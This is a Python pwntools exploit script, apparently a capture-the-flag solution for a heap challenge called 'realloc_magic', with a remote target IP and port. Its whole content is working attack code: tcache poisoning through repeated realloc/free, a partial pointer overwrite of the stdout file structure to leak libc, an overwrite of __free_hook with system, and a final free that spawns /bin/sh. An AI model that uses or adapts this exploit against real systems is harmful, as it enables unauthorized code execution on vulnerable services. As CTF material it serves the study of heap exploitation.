from pwn import *
debug=1
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
if debug:
    io = process("./realloc_magic.dms")
else:
    io = remote("39.97.182.233",37783)
elf = ELF('./realloc_magic.dms')
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
s       = lambda x      :io.send(str(x))
sa      = lambda x,y    :io.sendafter(str(x), str(y))
sl      = lambda x      :io.sendline(str(x))
sla     = lambda x,y    :io.sendlineafter(str(x), str(y))
r       = lambda x      :io.recv(x)
ru      = lambda x      :io.recvuntil(x)
def realloc(sz,data):
    ru('>> ')
    sl('1')
    ru('Size?')
    sl(str(sz))
    ru('Content?')
    s(data)
def free():
    ru('>> ')
    sl('2')
def ba():
    ru('>> ')
    sl('666')
    ru("Done\n")
realloc(0x100+0xf0+0x20-8,"0")
realloc(0x100+0xf0-8,"1")
for i in range(7):
    free()
realloc(0,'')
realloc(0x100-8,"2")
realloc(0,'')
realloc(0xf0-8,"3")
for i in range(7):
    free()
realloc(0,"")

realloc(0x1f0-8,"1"*0xf8+p64(0x31)+"\x60\x07\xdd")
realloc(0,'')
realloc(0xf0-8,"1")
realloc(0,'')
c=p64(0xfbad1800)
c+=p64(0x0)*3
c+='\x80'
realloc(0xf0-8,c)
ru('\n')
libc.address=u64(r(8))-0x3ec780
log.success("libc base:"+hex(libc.address))

ba()

realloc(0xe0+0x20-8,"1")
realloc(0xa0+0x40-8,"1")
for i in range(7):
    free()
realloc(0,'')
realloc(0xa0-8,"a")
realloc(0,'')
realloc(0x40-8,"a")
realloc(0,'')
realloc(0xa0+0x40-8,"1"*0x98+p64(0x51)+p64(libc.symbols['__free_hook']-8))
realloc(0,'')
realloc(0x40-8,"1")
realloc(0,'')
ogs=[324293,324386,1090444]
realloc(0x40-8,'/bin/sh\x00' + p64(libc.symbols['system']))

ru('>> ')
sl('2')

io.interactive()
